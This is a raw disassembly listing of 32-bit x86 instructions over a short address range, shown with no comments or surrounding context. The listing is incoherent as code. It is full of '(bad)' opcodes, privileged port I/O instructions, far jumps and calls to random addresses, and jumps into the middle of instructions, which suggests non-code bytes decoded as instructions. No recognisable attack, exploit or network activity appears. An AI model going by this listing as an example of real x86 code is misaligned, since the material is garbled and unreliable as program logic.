  41e0f6:	pop    ss
  41e0f7:	adc    al,0x81
  41e0f9:	in     al,0xc4
  41e0fb:	clc    
  41e0fc:	push   ds
  41e0fd:	jns    0x41e0e5
  41e0ff:	inc    ebx
  41e100:	out    0xbe,eax
  41e102:	movntps XMMWORD PTR [ebx],xmm4
  41e105:	arpl   WORD PTR ds:0xcbd6a7d6,bx
  41e10b:	xor    BYTE PTR [ebx-0x4f],ch
  41e10e:	sub    edx,DWORD PTR [ecx-0x66f43233]
  41e114:	xor    eax,0x4dbbeb95
  41e119:	test   BYTE PTR [eax+0x56bbde34],dl
  41e11f:	rcr    edi,cl
  41e121:	dec    ebp
  41e122:	retf   0x1311
  41e125:	xchg   ebp,eax
  41e126:	rcl    BYTE PTR [edx-0x6],cl
  41e129:	and    cl,BYTE PTR ds:0xa642e87b
  41e12f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e130:	sub    ch,BYTE PTR [ebp+0x761a1a51]
  41e136:	jne    0x41e106
  41e138:	xor    al,0x34
  41e13a:	mov    ah,0x4d
  41e13c:	mov    al,ds:0xc598109
  41e141:	int3   
  41e142:	out    0x91,al
  41e144:	fsubr  DWORD PTR [edx]
  41e146:	ins    DWORD PTR es:[edi],dx
  41e147:	or     ebx,ebp
  41e149:	pop    esp
  41e14a:	push   0x81bccae6
  41e14f:	imul   ebp,DWORD PTR [ebx-0x67],0xf5b10d4e
  41e156:	xchg   esp,eax
  41e157:	mov    dh,0xa4
  41e159:	sub    bh,BYTE PTR [edx+edx*4]
  41e15c:	push   ebp
  41e15d:	xor    edi,eax
  41e15f:	shl    BYTE PTR ss:[ebx+esi*2-0x26],1
  41e164:	cmp    BYTE PTR [ecx+0x1a],ah
  41e167:	cmp    esi,DWORD PTR [esi]
  41e169:	mov    edx,0xd40bd269
  41e16e:	sub    BYTE PTR [ecx-0x14],0x98
  41e172:	lds    ecx,FWORD PTR [eax+0x13]
  41e175:	xchg   ebp,eax
  41e176:	dec    ecx
  41e177:	or     ah,ch
  41e179:	xchg   BYTE PTR [ecx+0x6a],bl
  41e17c:	jmp    0x54d785a6
  41e181:	add    eax,DWORD PTR [ecx+0x67]
  41e184:	add    BYTE PTR [eax+edi*4+0x3ddbb0d7],ch
  41e18b:	inc    ebp
  41e18c:	xor    ebx,DWORD PTR [ecx]
  41e18e:	mov    dl,0x3d
  41e190:	aas    
  41e191:	ret    
  41e192:	mov    ds:0x47f097f3,eax
  41e197:	xchg   ebx,eax
  41e198:	mov    ebx,0x7726879
  41e19d:	mov    edi,0x1d8477b9
  41e1a2:	cmp    al,0x95
  41e1a4:	jae    0x41e1f2
  41e1a6:	test   DWORD PTR [ebp+0x7],edi
  41e1a9:	rol    BYTE PTR [ecx],0xa6
  41e1ac:	pop    esp
  41e1ad:	lahf   
  41e1ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1af:	arpl   WORD PTR [bx+si+0x17],bp
  41e1b3:	imul   ebp,esi,0xdedd6373
  41e1b9:	sub    DWORD PTR [ebx+eiz*8],esp
  41e1bc:	xchg   edx,eax
  41e1bd:	lds    ebp,FWORD PTR [ebx-0xa]
  41e1c0:	sbb    eax,0x86ac3242
  41e1c5:	push   esp
  41e1c6:	repnz mov ebx,DWORD PTR [edx-0x62b6ca74]
  41e1cd:	cmc    
  41e1ce:	(bad)  
  41e1cf:	fadd   QWORD PTR [edi]
  41e1d1:	clc    
  41e1d2:	ret    0x5081
  41e1d5:	jnp    0x41e196
  41e1d7:	sub    DWORD PTR [eax],ebp
  41e1d9:	push   ebp
  41e1da:	add    al,0x4c
  41e1dc:	fdivr  QWORD PTR [edi-0x6008e51]
  41e1e2:	mov    esi,0x14ae48dc
  41e1e7:	fmul   st,st(4)
  41e1e9:	mov    esi,0xe502285c
  41e1ee:	xchg   ebp,eax
  41e1ef:	cmp    eax,0x5a640aa5
  41e1f4:	outs   dx,DWORD PTR ds:[esi]
  41e1f5:	(bad)  
  41e1f6:	ins    BYTE PTR es:[edi],dx
  41e1f7:	sbb    ecx,edi
  41e1f9:	cmp    esi,DWORD PTR [eax-0x11cfe0c2]
  41e1ff:	sahf   
  41e200:	xor    al,0x94
  41e202:	jns    0x41e20e
  41e204:	jge    0x41e260
  41e206:	jno    0x41e218
  41e208:	in     al,dx
  41e209:	retf   
  41e20a:	lahf   
  41e20b:	dec    edi
  41e20c:	repz jmp 0x41e226
  41e20f:	icebp  
  41e210:	mov    BYTE PTR [edx-0x5505dab8],dh
  41e216:	and    ah,0x37
  41e219:	pop    ds
  41e21a:	hlt    
  41e21b:	adc    DWORD PTR [edx],esp
  41e21d:	mov    al,0xbb
  41e21f:	(bad)  [edx]
  41e221:	sbb    cl,BYTE PTR [edi]
  41e223:	cmp    BYTE PTR [ebp-0x2d],dh
  41e226:	jno    0x41e24a
  41e228:	inc    edx
  41e229:	adc    ecx,DWORD PTR [ebx]
  41e22b:	push   cs
  41e22c:	sti    
  41e22d:	jmp    0x41e2a8
  41e22f:	div    esi
  41e231:	jnp    0x41e223
  41e233:	out    dx,al
  41e234:	cmp    BYTE PTR [edi-0x55],al
  41e237:	push   edi
  41e238:	jae    0x41e2ad
  41e23a:	cmc    
  41e23b:	dec    edx
  41e23c:	(bad)  
  41e23d:	fwait
  41e23e:	addr16 js 0x41e228
  41e241:	rcr    DWORD PTR [edi-0x34f61ca0],cl
  41e247:	push   0x96f38869
  41e24c:	in     eax,dx
  41e24d:	lea    edi,ds:0xda478f96
  41e253:	jno    0x41e26f
  41e255:	xor    BYTE PTR [edx-0x67],bl
  41e258:	jle    0x41e216
  41e25a:	mov    eax,0x1719c6d0
  41e25f:	call   0xfcee:0x73a72786
  41e266:	xchg   ecx,eax
  41e267:	sti    
  41e268:	mov    ecx,0x638a8eed
  41e26d:	daa    
  41e26e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e26f:	mov    WORD PTR [esi],cs
  41e271:	ins    DWORD PTR es:[edi],dx
  41e272:	xor    DWORD PTR [edx-0x22],ebx
  41e275:	mov    ds:0xf3b4e7ae,eax
  41e27a:	inc    esp
  41e27b:	leave  
  41e27c:	pop    esp
  41e27d:	lahf   
  41e27e:	int    0x81
  41e280:	or     bh,BYTE PTR [edi+0x7adf52dc]
  41e286:	shl    DWORD PTR [edi-0x65],1
  41e289:	pop    ebx
  41e28a:	aas    
  41e28b:	sti    
  41e28c:	out    0xa7,al
  41e28e:	out    0x5f,al
  41e290:	mov    ah,0x8
  41e292:	mov    ebp,0x1020bedf
  41e297:	lock mov al,ds:0x28c1ff1
  41e29d:	out    dx,al
  41e29e:	mov    ebx,0xf6b3f90f
  41e2a3:	lods   al,BYTE PTR ds:[esi]
  41e2a4:	(bad)  
  41e2a5:	ins    DWORD PTR es:[edi],dx
  41e2a6:	cld    
  41e2a7:	push   ecx
  41e2a8:	pop    ebx
  41e2a9:	cmp    BYTE PTR [ebx+0x7c],ch
  41e2ac:	mov    ds:0xb22e863e,al
  41e2b1:	mov    ebx,0x2f4707b3
  41e2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2b7:	pusha  
  41e2b8:	(bad)  
  41e2b9:	add    al,0xb0
  41e2bb:	sbb    eax,0xe6c4475a
  41e2c0:	retf   
  41e2c1:	pusha  
  41e2c2:	push   cs
  41e2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2c4:	xor    ch,BYTE PTR [eax+0x34]
  41e2c7:	imul   ebx,DWORD PTR [esp+edi*2],0xa6d6d48c
  41e2ce:	lahf   
  41e2cf:	cmp    DWORD PTR [edx+ebx*4],eax
  41e2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d3:	sub    DWORD PTR [esi+0x7f8935a3],0xd1a5a36e
  41e2dd:	mov    cs,WORD PTR [esi+0x15]
  41e2e0:	shl    ebp,cl
  41e2e2:	test   BYTE PTR [edi],dl
  41e2e4:	dec    ecx
  41e2e5:	shl    DWORD PTR [ebp+0x73d429e7],cl
  41e2eb:	es test edi,esi
  41e2ee:	push   0x52
  41e2f0:	pop    ss
  41e2f1:	jl     0x41e317
  41e2f3:	or     eax,0xcc3970d3
  41e2f8:	ins    DWORD PTR es:[edi],dx
  41e2f9:	jmp    0xdbba056e
  41e2fe:	ror    BYTE PTR [ecx+0x79868b32],cl
  41e304:	sahf   
  41e305:	pop    edx
  41e306:	push   ecx
  41e307:	call   0x932d:0x23429992
  41e30e:	test   al,0x4
  41e310:	cmp    bh,BYTE PTR [eax+ebx*2+0x294308ac]
  41e317:	cmp    BYTE PTR [ecx],ch
  41e319:	adc    eax,0x3e009706
  41e31e:	cdq    
  41e31f:	mov    eax,ds:0xd7fd9678
  41e324:	mov    cl,0xd7
  41e326:	sahf   
  41e327:	addr16 mov esi,0xb9078277
  41e32d:	mov    es,WORD PTR [edi+0x43]
  41e330:	shl    ecx,0xda
  41e333:	jno    0x41e2e1
  41e335:	jb     0x41e2bf
  41e337:	adc    DWORD PTR [esi+0x21e8b3cf],ebp
  41e33d:	sbb    DWORD PTR [esi-0x1e],esi
  41e340:	mov    edx,0x69d898a4
  41e345:	loop   0x41e36d
  41e347:	and    al,0x55
  41e349:	sub    BYTE PTR [eax+ebp*4-0x31],0xf9
  41e34e:	mov    eax,ds:0xe9864164
  41e353:	sbb    esp,0xffffff85
  41e356:	pop    ebp
  41e357:	test   BYTE PTR [esi-0x49],0x80
  41e35b:	mov    ebx,0x28864192
  41e360:	je     0x41e388
  41e362:	or     eax,0x89f9090e
  41e367:	push   ds
  41e368:	int    0x8f
  41e36a:	mov    al,0x6f
  41e36c:	int3   
  41e36d:	pop    es
  41e36e:	push   esi
  41e36f:	jmp    0xe8af:0x2136157e
  41e376:	or     bl,BYTE PTR [ebp+0x66]
  41e379:	sbb    al,0x9
  41e37b:	in     al,dx
  41e37c:	dec    edi
  41e37d:	std    
  41e37e:	or     DWORD PTR [ecx+0x2dd07f0b],ecx
  41e384:	gs mov al,0x3d
  41e387:	popf   
  41e388:	pop    ebp
  41e389:	dec    esp
  41e38a:	fadd   DWORD PTR [ecx-0x1]
  41e38d:	cmp    DWORD PTR [ecx+ebx*2-0x64],eax
  41e391:	mov    ecx,0xe6cba018
  41e396:	sbb    edx,DWORD PTR [ebx+0x4741fb1]
  41e39c:	jge    0x41e368
  41e39e:	mov    al,0x4f
  41e3a0:	inc    ebx
  41e3a1:	into   
  41e3a2:	lahf   
  41e3a3:	mov    bl,0xe7
  41e3a5:	ficom  WORD PTR [eax-0x208bb9c0]
  41e3ab:	jmp    0x402c93a5
  41e3b0:	inc    edi
  41e3b1:	sbb    bh,BYTE PTR [edi-0x3a]
  41e3b4:	jle    0x41e3eb
  41e3b6:	arpl   WORD PTR [ecx+0x2bc3fe8f],si
  41e3bc:	mov    bl,0x69
  41e3be:	(bad)  
  41e3bf:	fs mov bh,0x65
  41e3c2:	in     eax,dx
  41e3c3:	push   eax
  41e3c4:	add    ch,BYTE PTR [eax-0x1]
  41e3c7:	lock icebp 
  41e3c9:	daa    
  41e3ca:	cdq    
  41e3cb:	ds ss out 0xf1,al
  41e3cf:	push   esp
  41e3d1:	or     eax,0x4fc1fb5c
  41e3d6:	xor    DWORD PTR [edx-0x45e0d517],edi
  41e3dc:	mov    ah,0x4b
  41e3de:	not    ecx
  41e3e0:	push   edi
  41e3e1:	repz enter 0x3bbf,0xe
  41e3e6:	sub    ch,dl
  41e3e8:	mov    al,0x62
  41e3ea:	ds popf 
  41e3ec:	adc    ebx,edx
  41e3ee:	mov    ?,WORD PTR [edi]
  41e3f0:	cld    
  41e3f1:	loopne 0x41e383
  41e3f3:	mov    dh,0x78
  41e3f5:	xchg   esp,eax
  41e3f6:	inc    ecx
  41e3f7:	push   ds
  41e3f8:	cmp    ebx,edi
  41e3fa:	mov    bh,0x81
  41e3fc:	cmp    eax,DWORD PTR [ecx-0x3e5a7a1d]
  41e402:	push   ecx
  41e403:	fwait
  41e404:	xchg   esi,eax
  41e405:	push   edi
  41e406:	std    
  41e407:	ret    
  41e408:	fbld   TBYTE PTR [edi-0x2e]
  41e40b:	in     al,dx
  41e40c:	xor    BYTE PTR [ebx+0x14],ch
  41e40f:	inc    ebx
  41e410:	leave  
  41e411:	rcr    DWORD PTR [edi],cl
  41e413:	js     0x41e44e
  41e415:	(bad)  
  41e416:	cld    
  41e417:	sub    DWORD PTR [esi-0x5b],esi
  41e41a:	and    DWORD PTR [eax+0xc291c4b],edi
  41e420:	dec    esi
  41e421:	cmp    al,0xa7
  41e423:	mov    esi,0xff1e59f6
  41e428:	in     al,0xd
  41e42a:	pop    edi
  41e42b:	sti    
  41e42c:	call   0xf89963ac
  41e431:	shr    DWORD PTR [edi+0x7d],0xde
  41e435:	idiv   al
  41e437:	stc    
  41e438:	ins    BYTE PTR es:[edi],dx
  41e439:	pop    edi
  41e43a:	nop
  41e43b:	add    edi,DWORD PTR [eax]
  41e43d:	mov    eax,0xe04ef7ea
  41e442:	pop    esi
  41e443:	nop
  41e444:	jnp    0x41e404
  41e446:	sbb    eax,0xf3dcf79
  41e44b:	mov    esp,0x71a4e11e
  41e450:	inc    esi
  41e451:	les    esp,FWORD PTR [esi+0x9b6d1b6]
  41e457:	mov    eax,0xcafd8751
  41e45c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e45d:	cmp    DWORD PTR [ebp-0x11],ebp
  41e460:	in     al,0xf1
  41e462:	or     edi,DWORD PTR [edi+0xa]
  41e465:	ss (bad) 
  41e467:	(bad)  
  41e468:	imul   ebx,DWORD PTR [edi],0x54ca124a
  41e46e:	sbb    ecx,DWORD PTR [ecx+0x6226895e]
  41e474:	inc    edx
  41e475:	and    al,0xba
  41e477:	and    al,0x74
  41e479:	shl    DWORD PTR [ecx+edx*1],1
  41e47c:	ins    DWORD PTR es:[edi],dx
  41e47d:	fcomi  st,st(4)
  41e47f:	mov    eax,0x212c5a15
  41e484:	inc    esp
  41e485:	(bad)  
  41e486:	les    edx,FWORD PTR [esp+ebp*8+0x59fe9093]
  41e48d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e48e:	dec    esp
  41e48f:	jbe    0x41e4d2
  41e491:	mov    ds:0xde1ca8a1,eax
  41e496:	cmp    ah,BYTE PTR [edx+0x76]
  41e499:	and    ah,BYTE PTR [eax]
  41e49b:	xor    al,0xd2
  41e49d:	and    BYTE PTR [edx],ch
  41e49f:	clc    
  41e4a0:	push   cs
  41e4a1:	lods   al,BYTE PTR ds:[esi]
  41e4a2:	xor    eax,ebx
  41e4a4:	inc    edx
  41e4a5:	sbb    BYTE PTR [edx-0x5bf85d6e],bl
  41e4ab:	xor    BYTE PTR [ecx+esi*4-0x60],dh
  41e4af:	xor    al,0x96
  41e4b1:	cs jbe 0x41e460
  41e4b4:	inc    edi
  41e4b5:	popa   
  41e4b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4b7:	mov    ecx,eax
  41e4b9:	pop    ds
  41e4ba:	lds    edx,FWORD PTR [edx+0x1a]
  41e4bd:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41e4bf:	lock lods al,BYTE PTR ds:[esi]
  41e4c1:	cwde   
  41e4c2:	mov    dh,BYTE PTR [esi]
  41e4c4:	sbb    cl,BYTE PTR [edx+0x14]
  41e4c7:	xchg   ecx,eax
  41e4c8:	push   ss
  41e4c9:	adc    ebx,ecx
  41e4cb:	sar    BYTE PTR [eax+ebp*1+0x6b3bf185],0x3c
  41e4d3:	sub    ah,BYTE PTR [edi]
  41e4d5:	js     0x41e50f
  41e4d7:	xchg   esp,eax
  41e4d8:	mov    esp,0x52b15c78
  41e4dd:	pop    eax
  41e4de:	out    0x2,al
  41e4e0:	jae    0x41e4b4
  41e4e2:	cwde   
  41e4e3:	ins    DWORD PTR es:[edi],dx
  41e4e4:	inc    edi
  41e4e5:	loop   0x41e4c0
  41e4e7:	idiv   DWORD PTR [edx]
  41e4e9:	jge    0x41e52b
  41e4eb:	jmp    0xa725:0xc37d9047
  41e4f2:	(bad)  
  41e4f3:	mov    ?,WORD PTR [esi-0x20c090bd]
  41e4f9:	out    dx,al
  41e4fa:	push   edi
  41e4fb:	cli    
  41e4fc:	jge    0x41e4e1
  41e4fe:	dec    edi
  41e4ff:	lahf   
  41e500:	lods   eax,DWORD PTR ds:[esi]
  41e501:	ja     0x41e505
  41e503:	std    
  41e504:	sub    bl,bh
  41e506:	mov    dl,dl
  41e508:	cdq    
  41e509:	and    al,0xc2
  41e50b:	mov    eax,ds:0x65dc779
  41e510:	in     al,0x42
  41e512:	mov    esi,0x24ac648d
  41e517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e518:	jg     0x41e55b
  41e51a:	jb     0x41e550
  41e51c:	adc    DWORD PTR [ebx],esp
  41e51e:	add    DWORD PTR [ebp-0x44],ebx
  41e521:	xlat   BYTE PTR ds:[ebx]
  41e522:	in     al,0x15
  41e524:	mov    esi,0x96c4bed3
  41e529:	jmp    0x41e515
  41e52b:	or     ebp,edx
  41e52d:	outs   dx,DWORD PTR ds:[esi]
  41e52e:	int3   
  41e52f:	xchg   ecx,eax
  41e530:	dec    ebx
  41e531:	fidiv  DWORD PTR [ecx-0x61]
  41e534:	sub    al,BYTE PTR [ecx+ecx*2]
  41e537:	iret   
  41e538:	imul   ebx,DWORD PTR [edi],0xef4648da
  41e53e:	xchg   ebx,eax
  41e53f:	test   DWORD PTR [edx+0x54],esp
  41e542:	push   eax
  41e543:	jae    0x41e585
  41e545:	push   ebp
  41e546:	clc    
  41e547:	shl    BYTE PTR [edi-0x76],0x7
  41e54b:	aas    
  41e54c:	jae    0x41e5cc
  41e54e:	inc    eax
  41e54f:	bound  esp,QWORD PTR [esi+0x20]
  41e552:	out    0xda,al
  41e554:	scas   al,BYTE PTR es:[edi]
  41e555:	push   ds
  41e556:	or     al,0x9
  41e558:	repnz ins DWORD PTR es:[edi],dx
  41e55a:	inc    esp
  41e55b:	jae    0x41e51c
  41e55d:	inc    eax
  41e55e:	pop    esp
  41e55f:	pusha  
  41e560:	add    dh,BYTE PTR [ecx]
  41e562:	rcr    DWORD PTR [ebx+0x721dc7b5],cl
  41e568:	sbb    DWORD PTR [ecx+eiz*1+0x72],esp
  41e56c:	inc    edx
  41e56d:	jmp    0x1a76:0xfff8fd0e
  41e574:	or     eax,0x8f81084a
  41e579:	std    
  41e57a:	ret    0x33cb
  41e57d:	push   edi
  41e57e:	and    dh,ch
  41e580:	cs clc 
  41e582:	ret    0xe471
  41e585:	clc    
  41e586:	sub    bh,BYTE PTR [ebx+0x5b]
  41e589:	push   ebx
  41e58a:	ss scas al,BYTE PTR es:[edi]
  41e58c:	outs   dx,BYTE PTR ds:[esi]
  41e58d:	xor    bh,BYTE PTR [esi]
  41e58f:	or     al,0xc7
  41e591:	outs   dx,BYTE PTR ds:[esi]
  41e592:	jg     0x41e5b0
  41e594:	out    0x5a,eax
  41e596:	sub    dh,BYTE PTR [ebx+0x22c78144]
  41e59c:	xor    al,0xc0
  41e59e:	xchg   edx,eax
  41e59f:	lods   eax,DWORD PTR ds:[esi]
  41e5a0:	cmp    DWORD PTR [ebp+0x6],ebx
  41e5a3:	test   ah,0xd2
  41e5a6:	(bad)  
  41e5a7:	dec    eax
  41e5a8:	pop    ss
  41e5a9:	cmp    al,BYTE PTR [esi]
  41e5ab:	(bad)  
  41e5ac:	push   ebx
  41e5ad:	xchg   edi,eax
  41e5ae:	dec    ecx
  41e5af:	cmc    
  41e5b0:	imul   esp,ebp,0xb3629f8d
  41e5b6:	stc    
  41e5b7:	or     al,0xd3
  41e5b9:	into   
  41e5ba:	adc    esi,DWORD PTR [ecx+0x58]
  41e5bd:	lahf   
  41e5be:	stos   BYTE PTR es:[edi],al
  41e5bf:	aas    
  41e5c0:	fisttp QWORD PTR [ebp+0x1b63d8db]
  41e5c6:	retf   
  41e5c7:	(bad)  
  41e5c8:	(bad)  
  41e5c9:	out    0xf0,al
  41e5cb:	lahf   
  41e5cc:	mov    esp,0xb7f38df9
  41e5d1:	cld    
  41e5d2:	rcl    ebx,cl
  41e5d4:	push   DWORD PTR gs:[ebx]
  41e5d7:	mov    edi,0x5e0bdbe0
  41e5dc:	push   es
  41e5dd:	mov    esp,0xe1f7b817
  41e5e2:	xchg   ebp,ecx
  41e5e4:	ins    BYTE PTR es:[edi],dx
  41e5e5:	xor    bh,bh
  41e5e7:	or     ebx,esp
  41e5e9:	lods   al,BYTE PTR ds:[esi]
  41e5ea:	adc    DWORD PTR [ebx+0x71],ebp
  41e5ed:	fisub  WORD PTR [ebp+0xc8bba2f]
  41e5f3:	(bad)  
  41e5f5:	dec    esp
  41e5f6:	cmp    DWORD PTR [ecx+ebp*8-0x5d0e231a],esp
  41e5fd:	xor    edi,DWORD PTR [esp+edi*2-0x1d]
  41e601:	add    DWORD PTR [edx+ebx*2-0x3287e2de],ecx
  41e608:	shl    DWORD PTR [ebp+0x2012a2cd],cl
  41e60e:	inc    ebp
  41e60f:	pop    edx
  41e610:	lds    edi,FWORD PTR [ebx-0x7ccafb70]
  41e616:	mov    ebp,DWORD PTR [eax+0x20d6748d]
  41e61c:	and    al,0x85
  41e61e:	pop    ebp
  41e61f:	pop    ss
  41e620:	enter  0xd792,0x96
  41e624:	mov    dh,0x13
  41e626:	mov    bx,0x9911
  41e62a:	adc    eax,0x37049738
  41e62f:	inc    edx
  41e630:	enter  0x278d,0x46
  41e634:	push   ecx
  41e635:	dec    ecx
  41e636:	(bad)  
  41e638:	or     ah,BYTE PTR es:[edx]
  41e63b:	push   ss
  41e63c:	and    esp,eax
  41e63e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e63f:	mov    al,ds:0xd1c38314
  41e644:	loope  0x41e5de
  41e646:	sub    ebp,DWORD PTR [ecx+ebp*2-0x65]
  41e64a:	xor    BYTE PTR [ebx],al
  41e64c:	xor    eax,0x11d76ec
  41e651:	mov    ebx,DWORD PTR [eax]
  41e653:	popa   
  41e654:	call   0x59ef9739
  41e659:	xchg   edx,eax
  41e65a:	add    DWORD PTR [ebx+0x192a3b1],edi
  41e660:	mov    ch,0x2c
  41e662:	sub    DWORD PTR [esi-0xfcca55d],0x2f
  41e669:	jecxz  0x41e645
  41e66b:	into   
  41e66c:	cmp    DWORD PTR [esi],edi
  41e66e:	sbb    bl,BYTE PTR [esi-0x37]
  41e671:	and    ebx,DWORD PTR [edx+0x73]
  41e674:	jecxz  0x41e62e
  41e676:	fs push esp
  41e678:	pop    eax
  41e679:	scas   al,BYTE PTR es:[edi]
  41e67a:	sub    eax,0x9d34f2f2
  41e67f:	pop    ss
  41e680:	ror    BYTE PTR [edx],cl
  41e682:	lahf   
  41e683:	repnz pop edi
  41e685:	cli    
  41e686:	out    0xb4,al
  41e688:	add    eax,0xe2c945a1
  41e68d:	popf   
  41e68e:	hlt    
  41e68f:	xor    eax,0xa3ab167c
  41e694:	fild   DWORD PTR [edi-0x4f8e1749]
  41e69a:	ds pop ebp
  41e69c:	or     BYTE PTR [ecx],bl
  41e69e:	push   ebx
  41e69f:	dec    eax
  41e6a0:	pusha  
  41e6a1:	mov    eax,ds:0xf3bee9d2
  41e6a6:	call   0xdf054c73
  41e6ab:	pop    edi
  41e6ac:	push   ds
  41e6ad:	test   al,0x21
  41e6af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6b0:	dec    eax
  41e6b1:	and    DWORD PTR [ebp+0x477f4d07],edi
  41e6b7:	leave  
  41e6b8:	sbb    bh,dh
  41e6ba:	fldenv ds:0xd9d798c5
  41e6c0:	ds dec edi
  41e6c2:	iret   
  41e6c3:	rol    eax,1
  41e6c5:	mov    esi,0x1001cfc2
  41e6ca:	xor    al,dh
  41e6cc:	sbb    al,0x25
  41e6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6cf:	jg     0x41e67b
  41e6d1:	pusha  
  41e6d2:	jb     0x41e6b0
  41e6d4:	add    bh,BYTE PTR ds:0x1c0e9f4a
  41e6da:	push   edx
  41e6db:	cs nop
  41e6dd:	adc    bl,BYTE PTR [eax-0x23059314]
  41e6e3:	pop    ebp
  41e6e4:	repnz jmp 0xbc79:0xcc47bdad
  41e6ec:	dec    eax
  41e6ed:	enter  0x4b8d,0xfb
  41e6f1:	out    dx,eax
  41e6f2:	aad    0x3
  41e6f4:	and    DWORD PTR [bp+si],ecx
  41e6f7:	xor    DWORD PTR [edi-0x5767740e],ebp
  41e6fd:	ja     0x41e681
  41e6ff:	hlt    
  41e700:	popf   
  41e701:	mov    BYTE PTR [ebp+0x2814e7f1],bh
  41e707:	sub    al,bh
  41e709:	dec    edi
  41e70a:	pop    ds
  41e70b:	daa    
  41e70c:	mov    dh,0x89
  41e70e:	dec    eax
  41e70f:	sbb    eax,0x80976803
  41e714:	call   0x9b74c57f
  41e719:	mov    ah,0x74
  41e71b:	ins    DWORD PTR es:[edi],dx
  41e71c:	mov    DWORD PTR [ebp-0x44ed5059],0x56778dc0
  41e726:	jl     0x41e703
  41e728:	sysexit 
  41e72a:	in     al,dx
  41e72b:	aad    0x8f
  41e72d:	jo     0x41e707
  41e72f:	scas   al,BYTE PTR es:[edi]
  41e730:	mov    dl,0x62
  41e732:	(bad)  
  41e733:	pop    eax
  41e734:	and    DWORD PTR [esi],0xfd4ba0ce
  41e73a:	and    al,0xa5
  41e73c:	sub    eax,0xe848b998
  41e741:	add    al,0x8d
  41e743:	push   es
  41e744:	addr16 sbb al,0x92
  41e747:	addr16 xor eax,0xa45c6046
  41e74d:	add    DWORD PTR [ecx+eax*1],ebp
  41e750:	mov    ebx,DWORD PTR [edx+0x5]
  41e753:	jno    0x41e729
  41e755:	mov    ds:0x3dd7d1c8,eax
  41e75a:	arpl   WORD PTR [esi],bp
  41e75c:	push   esi
  41e75e:	mov    cl,0xef
  41e760:	add    esi,ebx
  41e762:	repnz cmp DWORD PTR [eax-0x4243181e],ebx
  41e769:	pusha  
  41e76a:	in     eax,dx
  41e76b:	rcl    BYTE PTR [eax-0x62303ee4],0x3d
  41e772:	imul   ebx,esi,0xfffffff5
  41e775:	scas   eax,DWORD PTR es:[edi]
  41e776:	pop    ds
  41e777:	cmp    DWORD PTR [ebp-0x2c],eax
  41e77a:	xlat   BYTE PTR ds:[ebx]
  41e77b:	fwait
  41e77c:	ret    0xe318
  41e77f:	ins    BYTE PTR es:[edi],dx
  41e780:	push   edx
  41e781:	enter  0x2989,0x6f
  41e785:	xchg   edi,eax
  41e786:	jb     0x41e756
  41e788:	mov    ecx,0xb138e3ff
  41e78d:	sbb    DWORD PTR [ebx-0x64786502],0x1e
  41e794:	and    al,0x5c
  41e796:	jmp    0x3f23d2b
  41e79b:	mov    al,0x9a
  41e79d:	in     al,0xb8
  41e79f:	rol    DWORD PTR [ebp-0x63],cl
  41e7a2:	mov    eax,0xf54c5df2
  41e7a7:	in     eax,0x10
  41e7a9:	cmp    esi,DWORD PTR [eax+0x31]
  41e7ac:	bts    DWORD PTR [esp+eiz*4+0x73],edx
  41e7b1:	imul   edx,DWORD PTR [esi-0x7abe9ea2],0xb598510
  41e7bb:	popa   
  41e7bc:	jmp    0xed1a:0x15a24621
  41e7c3:	rcr    BYTE PTR [ecx],1
  41e7c5:	push   0x81f7e4d7
  41e7ca:	or     ebx,DWORD PTR [ecx-0x3]
  41e7cd:	ret    0xac5b
  41e7d0:	cmc    
  41e7d1:	js     0x41e826
  41e7d3:	pusha  
  41e7d4:	lea    esp,[ebx+0x46]
  41e7d7:	(bad)  
  41e7d8:	rcl    BYTE PTR [ecx],1
  41e7da:	mov    ah,0x65
  41e7dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7dd:	adc    eax,0x1330d6b3
  41e7e2:	mov    eax,ds:0x4a40ca8d
  41e7e7:	mov    esp,0x495d8c71
  41e7ec:	imul   edx,DWORD PTR [ebx+0x3371ef62],0x334e6864
  41e7f6:	xchg   esp,eax
  41e7f7:	xchg   edi,eax
  41e7f8:	xor    bl,ch
  41e7fa:	push   ds
  41e7fb:	popa   
  41e7fc:	ins    BYTE PTR es:[edi],dx
  41e7fd:	out    dx,al
  41e7fe:	bound  esp,QWORD PTR [ebx-0xa]
  41e801:	sub    al,0x7f
  41e803:	fdivr  DWORD PTR [edx+edx*4-0x59194e0d]
  41e80a:	jno    0x41e7d5
  41e80c:	mov    eax,ds:0x3089b1d2
  41e811:	and    eax,0xc893b4d5
  41e816:	fs jbe 0x41e88d
  41e819:	in     al,dx
  41e81a:	out    0xef,eax
  41e81c:	jae    0x41e870
  41e81e:	push   edi
  41e81f:	sahf   
  41e820:	and    edx,DWORD PTR [ecx+0x261ffa73]
  41e826:	inc    ebp
  41e827:	add    al,0xba
  41e829:	push   eax
  41e82a:	inc    eax
  41e82b:	xchg   BYTE PTR [esi+eax*8+0x4b],dl
  41e82f:	ffreep st(0)
  41e831:	(bad)  
  41e832:	sti    
  41e833:	sti    
  41e834:	out    0x1c,al
  41e836:	push   ebp
  41e837:	pop    ebp
  41e838:	xchg   esp,eax
  41e839:	pop    es
  41e83a:	out    0x9a,eax
  41e83c:	mov    ds:0x3e95fa00,eax
  41e841:	inc    edi
  41e842:	pop    es
  41e843:	in     al,0x95
  41e845:	sahf   
  41e846:	fs pop eax
  41e848:	inc    ecx
  41e849:	shr    DWORD PTR [edx],cl
  41e84b:	(bad)  
  41e84d:	jbe    0x41e866
  41e84f:	sti    
  41e850:	push   ebp
  41e851:	xor    bh,bh
  41e853:	or     edi,DWORD PTR [edx+0x7f4825df]
  41e859:	stos   DWORD PTR es:[edi],eax
  41e85a:	test   al,0xc4
  41e85c:	int3   
  41e85d:	icebp  
